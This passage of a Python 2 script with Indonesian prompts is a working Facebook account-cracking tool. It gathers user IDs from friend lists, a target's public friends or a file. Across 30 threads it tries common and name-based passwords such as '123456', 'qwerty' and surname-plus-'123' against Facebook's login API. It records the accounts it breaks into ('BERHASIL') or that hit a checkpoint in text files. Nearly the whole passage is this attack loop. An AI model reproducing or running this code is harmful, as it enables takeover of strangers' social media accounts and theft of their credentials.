                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/bangla.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            cek = open('done/bangla.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'bangladesh'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                oke = open('done/bangla.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                cek = open('done/bangla.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = '102030'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    oke = open('done/bangla.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    cek = open('done/bangla.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos7
                                        oke = open('done/bangla.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos7
                                        cek = open('done/bangla.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos8
                                            oke = open('done/bangla.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos8
                                            cek = open('done/bangla.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSelesai ...'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone bangla.'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m} ')
    os.system('python2 d4rk.py')


def crack_usa():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;37m{\x1b[1;33m01\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari Daftar Teman'
    print '\x1b[1;37m{\x1b[1;33m02\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari Publik/Teman'
    print '\x1b[1;37m{\x1b[1;33m03\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari File'
    print '\x1b[1;37m{\x1b[1;31m00\x1b[1;37m}\x1b[1;37m\x1b[1;37m Kembali'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_usa()


def pilih_usa():
    teak = raw_input('\x1b[1;33mPilih \x1b[1;31m:\x1b[1;37m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar Sayang !'
        pilih_usa()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        print '                \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif teak == '2' or teak == '02':
        os.system('clear')
        print logo
        print '                \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        idt = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mID Target \x1b[1;91m:\x1b[1;97m ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mNama Akun \x1b[1;91m:\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik tidak ada !'
            raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
            crack_usa()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    else:
        if teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print '                \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m} ')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                raw_input('\n\x1b[1;97m[\x1b[1;91mKembali\x1b[1;97m} ')
                crack_usa()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Dengan Benar !'
            pilih_usa()
        print '\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;97m\x1b[1;41;97m\nTidak Ada Hasil Gunakan Mode Pesawat 5 Detik\x1b[0m'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = 'iloveyou'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                oke = open('done/usa.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                cek = open('done/usa.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = '123456'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    oke = open('done/usa.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    cek = open('done/usa.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        oke = open('done/usa.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        cek = open('done/usa.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'qwerty'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            oke = open('done/usa.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            cek = open('done/usa.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
